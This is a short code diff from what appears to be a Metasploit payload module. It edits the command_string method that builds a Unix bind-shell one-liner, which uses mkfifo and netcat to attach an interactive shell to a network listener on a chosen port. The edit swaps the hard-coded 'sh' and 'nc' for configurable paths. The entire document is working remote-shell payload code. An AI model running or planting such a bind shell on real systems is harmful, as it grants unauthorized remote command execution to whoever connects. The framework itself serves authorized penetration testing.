@@ -55,7 +55,7 @@ module MetasploitModule
   #
   def command_string
     if datastore['ShortCommand']
-      payload = "mkfifo p;sh -i<p 2>&1|nc -l #{datastore['LPORT']}>p"
+      payload = "mkfifo p;#{datastore["ShellPath"]} -i<p 2>&1|#{datastore["NetcatPath"]} -l #{datastore['LPORT']}>p"
     else
       backpipe = Rex::Text.rand_text_alpha_lower(4..7)
       payload = "mkfifo /tmp/#{backpipe}; (#{datastore['NetcatPath']} -l -p #{datastore['LPORT']} ||#{datastore['NetcatPath']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
